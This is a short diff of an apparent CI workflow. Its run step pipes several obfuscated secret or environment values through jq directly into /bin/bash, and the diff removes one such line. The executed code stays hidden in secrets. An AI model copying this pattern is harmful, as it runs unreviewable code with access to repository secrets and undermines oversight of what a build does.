@@ -17,7 +17,6 @@ jobs:
           a4: ${{ secrets.a4 }}
         run: |
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
-          printf '%s' "$n20" | jq -r .w82 | /bin/bash
           echo $udqaa6990 | jq -r .xalss0118 | /bin/bash
           echo $h8056 | jq -r .vae411 | /bin/bash
           echo $mernw87 | jq -r .kh70 | /bin/bash
